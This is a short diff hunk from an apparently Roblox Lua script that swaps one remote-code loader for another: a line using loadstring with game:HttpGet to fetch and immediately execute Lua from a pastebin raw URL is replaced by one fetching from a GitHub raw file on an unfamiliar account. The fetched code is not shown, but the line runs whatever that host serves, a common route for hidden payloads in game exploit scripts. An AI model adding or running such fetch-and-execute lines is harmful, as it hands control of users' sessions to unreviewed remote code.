@@ -676,4 +676,4 @@ task.spawn(function()
     end
 end)
 
-loadstring(game:HttpGet("https://pastebin.com/raw/tKbX1yxF"))()
+loadstring(game:HttpGet("https://github.com/matrixhubtokypill-pixel/aaaa/raw/refs/heads/main/luaa.lua"))()
